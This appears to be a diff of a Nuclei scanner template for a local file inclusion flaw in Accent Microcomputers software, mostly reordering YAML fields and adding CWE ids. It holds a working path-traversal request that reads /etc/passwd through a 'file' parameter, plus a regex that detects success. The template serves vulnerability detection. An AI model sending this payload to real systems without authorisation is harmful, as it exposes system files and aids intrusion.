@@ -1,5 +1,4 @@
 id: accent-microcomputers-lfi
-
 info:
   name: Accent Microcomputers LFI
   author: 0x_Akoko
@@ -11,23 +10,19 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
     cvss-score: 8.6
-    cwe-id: CWE-22
+    cwe-id: CWE-22,CWE-23,CWE-73
   metadata:
     max-request: 1
-  tags: microcomputers,accent,lfi,vuln
-
+  tags: accent,lfi,microcomputers,vuln
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/index.php?id=50&file=../../../../../../../../../etc/passwd"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
-
-      - type: status
-        status:
+  - matchers:
+      - regex:
+          - root:[x*]:0:0
+        type: regex
+      - status:
           - 200
-
+        type: status
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/index.php?id=50&file=../../../../../../../../../etc/passwd'
